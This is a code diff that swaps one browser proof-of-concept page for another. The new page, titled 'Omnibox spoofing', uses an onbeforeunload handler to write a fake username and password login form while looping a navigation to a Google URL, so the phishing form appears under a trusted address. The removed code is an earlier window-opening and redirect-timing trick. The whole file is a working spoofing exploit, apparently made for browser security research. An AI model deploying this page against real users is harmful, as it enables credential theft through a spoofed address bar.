@@ -1,12 +1,24 @@
-<script>
-  function next() {
-	           setTimeout(function(){w.location='https://www.google.com/';}, 4000)
-        }
 
-  function f() {
-    w = window.open("https://share-target--squoosh.netlify.com/'");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<title>Omnibox spoofing</title>
+	<script>
+		window.onbeforeunload = function() {
+			document.write('<title>Fake website</title><br><br><center><h1>A fake website</h1><form method="post">Username: <input type="text" name="username" size="15"/><br/>Password: &nbsp;<input type="password" name="passwort" size="15"/><br/><div align="center"><p><input type="submit" value="Login"/></p></form></center>');
+			setInterval(function() {
+				location.href = "https://google.com/generate_204";
+			}, 0);
+		}
+	</script>
+</head>
 
-<a href="#" onclick="f()">Click here</a>
+<body>
+	<center>
+		<br>
+		<h1>Access any website using the omnibox</h1>
+	</center>
+</body>
+
+</html>
